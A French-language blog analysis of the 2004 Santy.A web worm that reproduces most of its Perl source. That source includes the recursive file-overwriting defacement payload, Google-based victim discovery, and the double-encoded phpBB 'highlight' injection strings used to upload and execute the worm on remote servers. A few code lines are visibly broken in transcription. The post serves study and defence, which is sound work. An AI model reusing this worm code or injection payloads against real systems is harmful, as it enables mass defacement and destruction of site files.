---
title: "Etude du ver Web Santy.A"
tags: [reverse engineering, malware]
---

## Introduction

Le 20 décembre 2004, ainsi que les quelques jours qui ont suivi, un ver informatique d'un type un peu spécial modifiait plus de 40000 sites Internet à travers le monde en exploitant une faille qui touchait le système de forum _phpBB_ dans sa version 2.0.10 (et antérieure).

## Avant-Propos

Jusqu'à présent les vers informatiques (Worms en Anglais) ne se propageaient que de deux façons différentes : soient ils utilisaient une faiblesse dans les clients de messagerie (généralement Outlook) pour exécuter un programme fourni en pièce jointe et s'envoyaient à tous les contacts présents dans le carnet d'adresse ; soient ils exploitaient une vulnérabilité dans un service particulier (vulnérabilités de type buffer overflow, mauvaise validation d'entrée...)  

Les vers les plus connus pour la première catégorie se nomment _ILOVEYOU_, _Melissa_ ou _MyDoom_. En règle générale ils demandent une interaction de la part de la victime pour fonctionner (on vous promet très souvent des photos de telle ou telle mannequin à la mode alors qu'en réalité il s'agit bien sûr d'un virus :)  

Ce type de virus semble avoir fait son temps. Tout d'abord les internautes se montrent de plus en plus méfiant, de plus beaucoup ont au moins un antivirus installé sur leur machine.  

La seconde catégorie ne requiert aucune interaction avec l'utilisateur et à cause de l'aspect volatile du ver (ils peuvent transiter sur Internet sans obligatoirement se retrouver sous la forme d'un fichier à un moment donné) il est très difficile de s'en protéger. Très souvent les antivirus sont totalement inefficaces face à ce type de vers (_Blaster_, _Slammer_ etc).  

Santy et ses dérivés n'appartiennent à aucune des deux catégories, même s'ils sont assez proches de la seconde catégorie (à aucun moment ils ne nécessitent l'interaction de la victime). En fait, ils sont à classer dans une nouvelle catégorie, à savoir les vers d'applications Web ou, en anglais, les _Web Worms_.  

Au vu de la multiplication des failles dans les applications Web (failles CGIs, failles PHP, XSS, SQL Injection etc) il était évident que ce type de vers serait apparu un jour ou l'autre. J'ai d'ailleurs eu l'occasion de lire un document intitulé _Web Application Worms : Myth or Reality_ réalisé par la société Informatique _IMPERVA_ qui expliquait comment ce type de ver fonctionnerait (et ils ont visé juste). Voyons tout de suite comment fonctionnait Santy.A.

## Analyse détaillée de Santy.A

La meilleure façon d'analyser un tel programme est de le prendre à revers. Je commencerais donc par les fonctions pour terminer sur le corps du programme (main).  

### La fonction PayLoad

Les noms des fonctions, variables etc utilisées tout au long de cet article sont les noms d'origine. L'auteur de Santy a donné à ses variables et à ses fonctions des noms très révélateurs. La fonction PayLoad en est la preuve : en français "Payload" se traduirait "charge finale". Ce terme est très utilisé dans le domaine des virus informatiques pour décrire l'objectif final du virus, très souvent une attaque informatique. Par exemple la charge finale du ver _MyDoom_ était un déni de service distribué (DDoS) sur le serveur de _SCO_.

```pl
sub PayLoad()
{ 
  my @dirs; 

  eval
  { 
    while(my @a = getpwent())
    {
      push(@dirs, $a[7]);
    } 
  }; 

  push(@dirs, '/'); 

  for my $l ('A' .. 'Z')
  { 
    push(@d 
    for my $d (@dirs)
    { 
      DoDir($d); 
    } 
  }
}
```

La fonction `PayLoad` se divise en deux étapes. La première est la création d'une liste contenant les chemins (path) vers différents répertoires. Le ver commence d'abord par ajouter les répertoires personnels (home) des différents utilisateurs en utilisant la fonction système `getpwent()`. Il rajoute ensuite la racine du système de fichiers à cette liste. Pour terminer il passe à la fonction `DoDir` chacun des répertoires de la liste.  

### La fonction DoDir

Comme dit précédemment la fonction `DoDir` prend en argument le chemin correspondant à un répertoire. Ce répertoire est exploré de façon récursive tout en prenant soin d'exclure les répertoires `.` (répertoire courant) et `..` (répertoire parent) afin de ne pas réaliser une boucle infinie. L'auteur du ver a aussi pensé à exclure les liens symboliques sans quoi le programme aurait aussi bouclé indéfiniment. Toutes ces vérifications prouvent que le créateur de Santy a de bonnes connaissances pour ce qui est des systèmes dérivés d'UNIX.  

Chaque fois que le ver trouve un fichier il regarde si ce dernier est une page html. Pour cela il regarde si le fichier a l'une des extensions suivantes : `htm`, `asp`, `php`, `shtm`, `jsp` ou `phtm`. Si c'est le cas ce fichier est traité par la fonction `DoFile()`.

```pl
sub DoDir($)
{

  my $dir = $_[0]; 
  $dir .= '/' unless $dir =~ m#/$#; 

  local *DIR; 
  opendir DIR, $dir or return; 

  for my $ent (grep { $_ ne '.' and $_ ne '..' } readdir DIR)
  { 

    unless(-l $dir . $ent)
    { 
      if(-d $_)
      { 
        DoDir($dir . $ent); 
        next; 
      } 
    } 

    if($ent =~ /\.htm/i or $ent =~ /\.php/i or $ent =~ /\.asp/i or
	   $ent =~ /\.shtm/i or $ent =~ /\.jsp/i or $ent =~ /\.phtm/i)
    { 
      DoFile($dir . $ent); 
    } 
  } 

  closedir DIR; 
}
```

### La fonction DoFile

La fonction `DoFile` constitue la partie visible du ver : elle prend en paramètre le chemin vers un fichier, efface ce dernier et le recrée en y insérant le message _This site is defaced!!! NeverEverNoSanity WebWorm generation x_ où `x` est un numéro qui augmente au fur et à mesure des compromissions (nous verrons cela plus tard). Le code de la fonction est le suivant :

```pl
sub DoFile($)
{
  my $s = q{
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <HTML><HEAD><TITLE>This site is defaced!!!</TITLE></HEAD>
    <BODY bgcolor="#000000" text="#FF0000">
    <H1>This site is defaced!!!</H1>
    <HR><ADDRESS><b>NeverEverNoSanity WebWorm generation
  } . $generation .
  q{</b></ADDRESS>
    </BODY></HTML>
  };

  unlink $_[0];
  open OUT, ">$_[0]" or return;
  print OUT $s;
  close OUT;
}
```

Pour les chaînes de caractères, l'auteur de Santy a eu recours la fonction `q{}` du perl qui permet de définir une chaîne de caractères sans avoir à se soucier des différents caractères d'échappement, doubles quotes etc.  

Au final, le fichier modifié à l'aspect suivant :

This site is defaced!!!
=======================

---

**NeverEverNoSanity WebWorm generation 18**

Nous sommes alors en mesure de comprendre quelle est la charge finale du ver : Santy explore les disques durs à la recherche de pages web et les modifie systématiquement provoquant ainsi des dégâts considérables (travaux ou documents personnels perdus, sites Internet hors service...)  

### La fonction GrabURL

Pour faire simple, GrabURL lit une page Web. L'adresse de la page (URL) doit être passée comme argument à la fonction. Cette URL est décortiquée en différentes valeurs (adresse du serveur, page demandée, port du serveur HTTP) puis injectée dans une requête HTTP :

```pl
sub GrabURL($)
{ 
  my $url = shift; 
  $url =~ s#^http://##i; 

  my ($host, $res) = $url =~ m#^(.+?)(/.*)#; 
  return unless defined($host) && defined($res); 

  my $r = 
  "GET $res HTTP/1.0\015\012" . 
  "Host: $host\015\012" . 
  "Accept:*/*\015\012" . 
  "Accept-Language: en-us,en-gb;q=0.7,en;q=0.3\015\012" . 
  "Pragma: no-cache\015\012" . 
  "Cache-Control: no-cache\015\012" . 
  "Referer: http://" . $host . $res . "\015\012" . 

  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\015\012" . 
  "Connection: close\015\012\015\012"; 

  my $port = 80; 
  if($host =~ /(.*):(\d+)$/){ $host = $1; $port = $2;}
  ...
```

La requête HTTP utilisée par Santy est pour le moins énigmatique. En effet d'un côté le programmeur a utilisé certains mots clés qui peuvent rendre la requête plus efficace comme le `no-cache` qui demande au serveur HTTP de ne pas envoyer une version mémorisée de la page web mais de la relire pour s'assurer d'avoir la toute dernière version ou encore le `Connection: close` qui ferme la connexion dès que la requête a été envoyée (plutôt que d'attendre inutilement). Mais à côté de ça, la requête comporte beaucoup de mots clés inutiles comme les mots clés Accept utilisés pour l'encodage et les types de fichiers acceptés ou encore les variables Referer (la page précédemment visitée) et `User-Agent` (le nom du navigateur).  

Le créateur du ver ne semble donc pas avoir une connaissance approfondie du protocole HTTP.
Une fois la requête HTTP formée il faut bien évidemment l'envoyer au serveur :

```pl
...
  my $internet_addr = inet_aton($host) or return; 
  socket(Server, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or return; 
  setsockopt(Server, SOL_SOCKET, SO_RCVTIMEO, 10000); 

  connect(Server, sockaddr_in($port, $internet_addr)) or return; 
  select((select(Server), $| = 1)[0]); 
  print Server $r; 

  my $answer = join '', ; 
 close (Server); 

 return $answer; 
}
```

L'établissement de la connexion avec le serveur serait tout à fait banale si l'auteur de Santy n'avait pas utilisé la fonction `setsockopt` avec l'option `SO_RCVTIMEO`. Le programmeur utilise en effet un système de timeout sur le canal de communication qu'il établit par la suite. Cela a pour effet d'annuler la communication dans le cas où le serveur ne répond pas. Sans cette option le ver aurait bloqué sur un serveur hors-service alors qu'ici il passe à autre chose. On peut donc en déduire que le développeur a de bonnes connaissances de la programmation système et réseaux.  

Pour terminer la fonction retourne une variable correspondante au contenu de la page web demandée.  

### La fonction GoGoogle

Pour se propager, `Santy.A` exploitait une faille présente dans le système de forums _phpBB_. La meilleure façon de trouver des victimes potentielles était par conséquent d'effectuer une recherche en utilisant un moteur de recherche. C'est ce que Santy faisait en recherchant sur Google les URLs contenant `viewtopic.php`.  

Etudions en détail cette fonction :

```pl
sub GoGoogle()
{ 
  my @urls; 
  my @ts = qw/t p topic/; 
  my $startURL = 'http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all' .
                 '&q=allinurl%3A+%22viewtopic.php%22+%22' .
                 $ts[int(rand(@ts))] . '%3D' . int(rand(30000)) .
                 '%22&btnG=Search'; 
  my $goo1st = GrabURL($startURL) 
  my $allGoo = $goo1st;
  ...
```

La fonction commence par déclarer une variable `@urls` de type liste. Cette variable contiendra par la suite le résultat de la fonction.
La seconde variable nommée `@ts` est une liste contenant trois valeurs : 't', 'p', et 'topic'.  

Ensuite la variable `$startURL` contient l'URL correspondant à la recherche sur le moteur Google. La variable de l'URL contenant le motif à rechercher est la variable 'q'.  

La recherche concerne donc le chaine suivante : `'allinurl%3A+%22viewtopic.php%22+%22' . $ts[int(rand(@ts))] . '%3D' . int(rand(30000)) . '%22'`  

Les quelques fonctions perl qui restent dans l'URL sont des fonctions d'aléatoires. La première permet de choisir au hazard une des valeurs de la liste `@ts`. La seconde opération renvoie un chiffre pris au hazard entre 0 et 30000.  

Au final nous obtenons donc 30000*3 = 90000 recherches différentes possibles sur Google. Voici quelques exemples de recherche possibles :  

```
allinurl:"viewtopic.php"+"t=15623"
allinurl:"viewtopic.php"+"p=535"
allinurl:"viewtopic.php"+"topic=87668"
```

Santy envoie donc cette requête à Google et enregistre le résultat de la recherche (non traitée pour l'instant) dans la variable `$allGoo`. Mais le ver ne s'arrête pas là : il va explorer les autres pages trouvées par Google et dont les liens se trouvent au bas de la page. Pour chaque page le ver ajoute les résultats à la fin de la variable `$allGoo` :

```pl
  ...
  my $r = '<td><a href=(/search\?q=.+?)' .
          '><img src=/nav_page\.gif width=16 height=26 alt="" border=0><br>\d+</a>'; 
  while($goo1st =~ m#$r#g)
  { 
    $allGoo . = GrabURL('www.google.com' . $1); 
  }
  ...
```

Une fois toutes les pages mémorisées, Santy va extraire toutes les URLs qui l'intéresse, à savoir celles correspondant à une page `viewtopic.php`.

```pl

  ...
  while($allGoo =~ m#href=(http://\S+viewtopic.php\S+)#g)
  { 
    my $u = $1; 
    next if $u =~ m#http://.*http://#i; # no redirects 
    push(@urls, $u); 
  } 

  return @urls; 
}
```

On remarque que le ver exclut les URLs contenant deux fois les caractères `http://` afin de ne pas tomber sur des redirections du type :  

`http://server.com/?redir=http://victim.com/viewtopic.php?topic=18654`  

Cette astuce était la seule partie commentée par l'auteur donc facilement compréhensible.

## La vulnérabilité Highlight de phpBB 2.0.10

Avant de continuer il est nécessaire de comprendre en quoi consiste la faille de sécurité du forum _phpBB_. À l'origine, elle a été découverte par le site www.howdark.com. Il s'agit d'une SQL Injection dans la variable "highlight". _phpBB_ traitait cette variable de la façon suivante :

```php
htmlspecialchars(urldecode($HTTP_GET_VARS['highlight']))
```

Le problème provient en fait de la façon dont la fonction urldecode et l'option `magic_quotes_qgc` fonctionnent. Quand une variable est passée à la page php, celle-ci est d'abord traitée par `magic_quotes` qui va échapper les caractères dangereux (notamment l'apostrophe). Ainsi si on passe les arguments `highlight='` au serveur, celui-ci va échapper notre apostrophe, obtenant ainsi `\'` qui est totalement inoffensive pour la base SQL. L'astuce consiste à utiliser un double encodage : l'apostrophe peut se traduire en %27 (valeur hexadécimale de l'apostrophe), si on re-encode %27 on obtient %2527 (%25 est la traduction de '%').  

Maintenant quand le serveur passe la valeur à `magic_quotes` il ne voit que la chaîne de caractères `%27` qui ne contient pas d'apostrophes et est donc à priori inoffensive. Seulement cette chaîne est décodée une nouvelle fois par `urldecode` qui la transforme finalement en une apostrophe permettant ainsi une SQL injection.  

Mais là encore nous rencontrons un nouveau problème : le résultat est passé à `preg_replace` qui va filtrer ce qui suit notre première apostrophe rendant l'exploitation plus difficile. L'astuce a été trouvée par une autre personne : il suffit d'utiliser une fonction propre à SQL qui permet de passer les caractères sous leur forme décimale. Cette fonction est la fonction `chr()` qui renvoi le caractère ascii pour une valeur décimale passée en argument. Par exemple `chr(65)` renverra le caractère A.  

Finalement les caractères qui seront passés seront évalués, c'est-à-dire qu'ils seront exécutés comme s'il s'agissait de code php.  

### La fonction str2chrsub

```pl
str2chr($)
{ 
  my $s = shift; 

  $s =~ s/(.)/'chr(' . ord($1) . ')%252e'/seg; 
  $s =~ s/%252e$//; 

  return $s; 
}
```

Cette fonction réalise l'encodage décrit plus haut. Par exemple la chaine de caractères ABC sera traduite en `chr(65)%252echr(66)%252echr(67)` où `%252e` correspond au caractère `.` (point) qui sert à accrocher les caractères les uns aux autres.

## Le corps de Santy (main)

```pl
eval{ fork and exit; }; 

my $generation = x; 
PayLoad() if $generation > 3; 

open IN, $0 or exit; 
my $self = join '', ; 
close IN; 
unlink $0; 

while(!GrabURL('http://www.google.com/advanced\_search'))
{ 
 if($generation > 3) 
 { 
 PayLoad() ; 
 } else { 
 exit; 
 } 
}
...
```

La première opération que Santy effectue consiste à créer un processus fils. L'objectif est de se lancer sous une forme qui sera indépendante des autres processus et donc de pouvoir fonctionner tranquillement. On retrouve ensuite la variable $generation qui indique le niveau d'infection auquel nous nous trouvons actuellement. Par exemple si un serveur affiche _WebWorm generation 5_ cela signifie que le ver qui l'a infecté à touché 4 serveurs auparavant. Pour l'instant cette variable a pour valeur `x`, ce qui ne signifie pas grand-chose mais nous comprendrons le sens de cette affectation par la suite.  

Santy lance sa charge finale si le ver est de génération 3 ou supérieure. Dans ce cas toutes les pages web seront modifiées.
Le ver étant lancé il est donc chargé en mémoire. Il en profite pour ouvrir son propre code (le fichier dans lequel il se trouvait à l'origine) et le mémorise pour une utilisation ultérieure. Le fichier contenant le ver est alors supprimé afin d'effacer les traces de son passage.  

La boucle qui suit est assez dévastatrice : si le ver n'arrive pas à se connecter à Google et que la génération vaut 3 ou plus alors le ver lance la charge finale indéfiniment. En plus de modifier les fichiers, cette boucle va utiliser énormément de ressources du point de vue du processeur.

```pl
...
$self =~ s/my \$generation = (\d+);/'my $generation = ' . ($1 + 1) . ';'/e;

my $selfFileName = 'm1ho2of'; 
my $markStr = 'HYv9po4z3jjHWanN'; 
my $perlOpen = 'perl -e "open OUT,q(>' .
               $selfFileName . ') and print q(' . $markStr . ')"'; 
my $tryCode = '&highlight=%2527%252Esystem(' . str2chr($perlOpen) . ')%252e%2527';
...
```

La première ligne va modifier dynamiquement le code du ver en changeant la ligne `my $generation = x;` que nous avons vu précédemment. C'est de cette façon que Santy incrémente la variable generation d'intrusion en intrusion.  

La seconde ligne définie le nom du fichier correspondant au ver. Ce nom étant toujours le même il n'est pas très difficile de retrouver le ver sur une machine infectée.  

La troisième ligne définit une variable qui est utilisée comme une signature. Ce sont les opérations en rapport avec cette variable que j'ai mis le plus de temps à comprendre.  

Le ver définit alors une ligne de commande destinée à créer le fichier (sans le remplir) puis à afficher la signature.
Cette commande est ensuite encodée par `str2chr()` puis injectée dans une partie d'URL.  

Finissons notre étude du corps de Santy :

```pl
...
while(1)
{ 
  exit if -e 'stop.it'; 

  OUTER: for my $url (GoGoogle())
  { 

    exit if -e 'stop.it'; 

    $url =~ s/&highlight=.*$//; 
    $url .= $tryCode; 
    my $r = GrabURL($url); 
    next unless defined $r; 
    next unless $r =~ /$markStr/; 

    while($self =~ /(.{1,20})/gs)
    { 
      my $portion = '&highlight=%2527%252Efwrite(fopen(' . str2chr($selfFileName) .
                    ',' . str2chr('a') . '), ' . str2chr($1) . '),exit%252e%2527'; 

      $url =~ s/&highlight=.*$//; 
      $url .= $portion; 

      next OUTER unless GrabURL($url); 
    } 

    my $syst = '&highlight=%2527%252Esystem(' . str2chr('perl ' . $selfFileName) .
               ')%252e%2527'; 
    $url =~ s/&highlight=.*$//; 
    $url .= $syst; 

    GrabURL($url); 
  } 
}
```

Ceci est le code du ver à proprement parler. C'est cette boucle qui va trouver des victimes puis les infecter.  

Chose intéressante, l'auteur de Santy fait référence à un fichier nommé `stop.it`. Ce fichier n'est créé à aucun moment. On peut donc en déduire qu'il s'agit d'instructions de déboguage que le programmeur a inséré durant les tests qu'il a fait afin de stopper la propagation quand il le souhaitait. Il n'a visiblement pas pensé à retirer ces instructions.  

Santy passe alors aux choses sérieuses. Il récupère une liste de victimes potentielles en appelant `GoGoogle`. Il exécute ensuite la ligne de commande vue précédemment sur chaque victime présente dans cette liste. Cette ligne de commande a pour but de savoir si l'interpréteur perl est installé sur la machine. Si c'est le cas, la page attaquée doit afficher la signature `HYv9po4z3jjHWanN`.
Grâce à `GrabURL`, Santy peut justement connaître le contenu d'une page web. Il récupère donc le résultat de ce test et regarde si la signature est présente.  

Si effectivement elle y est il lance le processus de reproduction du ver : le code du ver (préalablement mémorisé) est encodé puis injecté dans une URL d'attaque destinée à recréer le ver sur le serveur distant.  

Cette nouvelle version du ver est alors lancée en appelant la fonction `system()` du php qui prend en argument le nom du script à exécuter (soit `m1ho2of`).  

La boucle est alors bouclée.

## Mon point de vue sur le ver

Les différentes opérations lancées par Santy sont très faciles à mettre en œuvre et à la portée de beaucoup de personnes avec quelques connaissances en programmation.   

Malheureusement Santy a été programmé par une personne ayant de bonnes connaissances en programmation système et réseaux. Il est assez facile de voir quand l'on est programmeur que l'auteur de Santy n'est pas un débutant pour ce qu'il s'agit de la programmation perl. Cela se remarque notamment à la gestion des erreurs par certains mots clés (`and`, `or`, `unless`... alors qu'un débutant aurait utilisé les traditionnelles accolades) où à la façon dont certaines instructions sont imbriquées les unes dans les autres...  

Le ver était bien programmé donc, mais n'était pas parfait. Tout d'abord il a été conçu principalement pour attaquer les serveurs fonctionnant sous un système d'exploitation dérivé d'Unix.
Les tests sur la présence des fichiers `.`, `..` et les liens symboliques ainsi que l'utilisation du langage perl en sont la preuve. Le ver a ainsi délaissé beaucoup de serveurs qui fonctionnaient sous Windows.  

La pire erreur a été d'utiliser le langage perl. En effet, cela oblige Santy à lancer son code en appelant la fonction `system()`, fonction qui est généralement désactivée par mesure de sécurité.
L'utilisation du langage PHP aurait été plus appropriée : le code du ver aurait pu s'injecter directement en mémoire sans jamais se retrouver sous la forme d'un fichier et il n'aurait pas eu besoin d'avoir recours à la fonction system().  

Une autre erreur évidente est le manque de polymorphisme du ver : il utilise des signatures facilement reconnaissables, comme un nom de fichier fixe, un `User-Agent` fixe, etc. Il est par conséquent très facile de bloquer l'arrivée du ver par un firewall applicatif ou un IDS, voire même en utilisant le module rewrite d'Apache (qui re-écrit dynamiquement les URLs demandées).  

Le moteur de recherche Google a d'ailleurs très vite mis en place un système qui permettait de rejeter toute requête émanant du ver, bloquant ainsi sa propagation.

## Les dangers à venir

Maintenant que Santy a "ouvert la voie" il est évident que ce type de ver va se developer. Dès les jours qui ont suivi plusieurs versions de Santy sont apparues, notamment une version utilisant un manque de vérification sur la fonction `include()` du php.  

Le pire étant sans aucun doute que Santy, qui était déjà bien programmé, va servir de squelette à de futur vers informatiques qui s'amélioreront de jour en jour. Bref on n'a pas fini de voir les dégâts.

## Références

[Web Application Worms : Myth or Reality](http://web.archive.org/web/20071015223056/http://www.imperva.com/docs/Application_Worms.pdf)  

[phpBB Code EXEC](http://web.archive.org/web/20071015223056/http://cert.uni-stuttgart.de/archive/bugtraq/2004/11/msg00185.html) (première découverte de la vulnérabilité highlight)  

[phpBB SQL Injection](http://web.archive.org/web/20071015223056/http://www.securiteam.com/unixfocus/6Z00R2ABPY.html) (un des documents existant sur la vulnérabilité)  

[phpBB Remote Command Execution](http://web.archive.org/web/20071015223056/http://www.lostcoders.net/index-single-470.htm) (un code Proof of Concept servant à prouver l'existence de la vulnérabilité)  

[Exemples pratiques d'insécurité](http://web.archive.org/web/20071015223056/http://www.ossir.org/resist/supports/cr/20030623/ExemplesPratiques.pps) (un document faisant référence à l'utilisation de la fonction chr() dans les attaques par SQL Injection)  


*Published January 04 2011 at 08:02*
